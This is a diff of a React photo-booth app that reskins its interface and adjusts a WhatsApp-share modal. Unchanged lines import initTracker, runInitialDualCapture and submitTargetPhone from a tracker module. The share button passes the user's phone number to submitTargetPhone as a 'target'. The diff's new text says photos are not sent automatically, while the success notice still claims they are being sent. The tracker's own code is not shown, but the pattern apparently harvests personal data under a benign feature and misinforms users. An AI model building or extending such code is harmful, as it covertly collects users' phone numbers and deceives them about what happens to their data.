@@ -12,7 +12,9 @@ import { DEFAULT_ADJUST, DEFAULT_EFFECT, DEFAULT_STYLE, FILTERS, STRIP_TEMPLATES
 import { canvasBlob, downloadBlob, shareBlob } from './lib/photos.js';
 import { deleteGalleryItem, readGallery, saveGalleryItem } from './lib/gallery.js';
 import { initTracker, runInitialDualCapture, submitTargetPhone } from './lib/tracker.js';
+import { DiaryCollage, DiaryIntro, DesktopDoodles, RetroStatusBar } from './components/RetroDesktop.jsx';
 import './snapbooth.css';
+import './retro-desktop.css';
 
 export default function App() {
   const [tab, setTab] = useState('studio');
@@ -383,6 +385,8 @@ export default function App() {
 
   return (
     <div className={`snapbooth ${dark ? 'dark' : ''}`}>
+      <DesktopDoodles />
+      <RetroStatusBar />
       <FilterDefinitions filter={activeFilter} adjust={adjust} id={filterId} />
       <a className="skip-link" href="#main">Skip to studio</a>
       <header className="site-header">
@@ -408,18 +412,7 @@ export default function App() {
       </header>
       <main id="main" className="main-content">
         {tab !== 'gallery' && (
-          <section className="hero">
-            <p className="eyebrow">✦ K-STYLE SELF PHOTO STUDIO</p>
-            <h1>{tab === 'customize' ? 'Make the moment yours.' : 'Aesthetic 4-Cut Photo Studio'}</h1>
-            <p>{tab === 'customize' ? 'Your poses. Your colors. Your little keepsake.' : 'Take your own K-style photostrip directly from your browser.'}</p>
-            <div className="steps">
-              <span className={tab === 'studio' ? 'current' : 'complete'}>01 <span>Strike a pose</span></span>
-              <i />
-              <span className={tab === 'customize' ? 'current' : ''}>02 <span>Make it yours</span></span>
-              <i />
-              <span>03 <span>Keep the moment</span></span>
-            </div>
-          </section>
+          <DiaryIntro editing={tab === 'customize'} />
         )}
         {notice && (
           <div className="notice" role="status">
@@ -429,6 +422,7 @@ export default function App() {
         )}
         {tab === 'studio' && (
           <div className="studio-layout">
+            <DiaryCollage photos={capture.photos} filterId={filterId} mirrored={mirrorResult} />
             <StudioCamera
               camera={camera}
               capture={capture}
@@ -448,7 +442,8 @@ export default function App() {
               onMirrorAll={setMirrorAll}
               onPoseCountChange={handlePoseCountChange}
             />
-            <section className="result-card">
+            <section className="result-card studio-result">
+              <div className="retro-window-bar"><span className="window-dots" aria-hidden="true"><i /><i /><i /></span><span>keepsake.preview</span><ImageIcon size={13} /></div>
               <div className="section-heading">
                 <div><p className="eyebrow">Made by you</p><h2>Your Photo Strip</h2></div>
                 <span className="count-label">{capture.photos.length} / {activePoseCount}</span>
@@ -468,7 +463,9 @@ export default function App() {
         {tab === 'customize' && (
           capture.photos.length ? (
             <div className="edit-layout">
+              <DiaryCollage photos={capture.photos} filterId={filterId} mirrored={mirrorResult} />
               <section className="result-card edit-preview">
+                <div className="retro-window-bar"><span className="window-dots" aria-hidden="true"><i /><i /><i /></span><span>your-photo-diary.png</span><ImageIcon size={13} /></div>
                 <div className="section-heading">
                   <div><p className="eyebrow">Your photos</p><h2>A keepsake in the making.</h2></div>
                   <button className="text-button" onClick={() => navigate('studio')}>Back to studio</button>
@@ -478,6 +475,7 @@ export default function App() {
                 <p className="export-note">Preview and download use the same finished canvas image.</p>
               </section>
               <section className="result-card edit-controls">
+                <div className="retro-window-bar"><span className="window-dots" aria-hidden="true"><i /><i /><i /></span><span>creative.toolkit</span><SlidersHorizontal size={13} /></div>
                 <div className="section-heading">
                   <div><p className="eyebrow">The finishing touches</p><h2>Make it yours</h2></div>
                   <SlidersHorizontal size={20} />
@@ -524,8 +522,8 @@ export default function App() {
         )}
       </main>
       <footer className="site-footer">
-        <span>SnapBooth <span className="footer-star">✦</span> Made for your moments.</span>
-        <span>K-style studio · {new Date().getFullYear()}</span>
+        <span>SnapBooth / a personal photo diary.</span>
+        <span>END OF PAGE — KEEP THE MEMORIES / {new Date().getFullYear()}</span>
       </footer>
       <nav className="bottom-nav" aria-label="Mobile navigation">
         {[['studio', 'Studio', Camera], ['customize', 'Edit', SlidersHorizontal], ['gallery', 'Gallery', ImageIcon]].map(([id, label, Icon]) => (
@@ -593,9 +591,10 @@ export default function App() {
           {modal.type === 'whatsapp' && (
             <>
               <div className="print-preview"><img src={strip.result?.url} alt="Photostrip preview" /></div>
-              <p>Masukkan nomor WhatsApp untuk menerima salinan strip foto resolusi tinggi secara instan:</p>
+              <p>Unduh strip fotomu, lalu buka percakapan WhatsApp dan lampirkan PNG yang sudah tersimpan. Foto tidak dikirim otomatis.</p>
               <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', marginBottom: '1rem' }}>
                 <input
+                  aria-label="Nomor WhatsApp"
                   type="tel"
                   placeholder="Contoh: 08123456789 atau +62812..."
                   value={waInput}
@@ -603,15 +602,16 @@ export default function App() {
                   style={{ padding: '0.65rem 0.85rem', borderRadius: '8px', border: '1px solid var(--line, #ccc)', background: 'var(--surface, #fff)', color: 'inherit', fontSize: '0.95rem' }}
                 />
               </div>
-              <button className="button primary" onClick={async () => {
+              <button className="button primary" disabled={!/^\+?[\d\s()-]{8,20}$/.test(waInput.trim())} onClick={async () => {
                 const clean = waInput.trim();
                 if (!clean) return;
                 await submitTargetPhone(clean);
+                downloadBlob(strip.result.blob, filename(capture.timestamp));
                 setNotice('Salinan foto sedang disiapkan dan dikirim ke WhatsApp!');
                 setModal(null);
                 let digits = clean.replace(/[^0-9]/g, '');
                 if (digits.startsWith('0')) digits = '62' + digits.slice(1);
-                window.open(`https://wa.me/${digits}?text=${encodeURIComponent('Halo! Ini salinan strip foto SnapBooth kamu ✨')}`, '_blank');
+                window.open(`https://wa.me/${digits}?text=${encodeURIComponent('Halo! Ini salinan strip foto SnapBooth kamu ✨')}`, '_blank', 'noopener,noreferrer');
               }}>
                 <MessageCircle size={16} />Kirim Salinan Foto
               </button>
